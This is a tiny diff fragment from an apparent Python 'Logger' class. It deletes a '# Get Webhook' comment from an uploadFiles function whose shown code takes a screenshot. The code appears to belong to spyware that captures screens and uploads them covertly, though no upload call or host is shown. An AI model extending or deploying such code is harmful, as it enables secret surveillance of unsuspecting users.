@@ -186,8 +186,6 @@ class Logger():
         except Exception as e:
             print(e)
     def uploadFiles():
-    	# Get Webhook
-
         # Get screenshot
         try:
             screen = ImageGrab.grab()
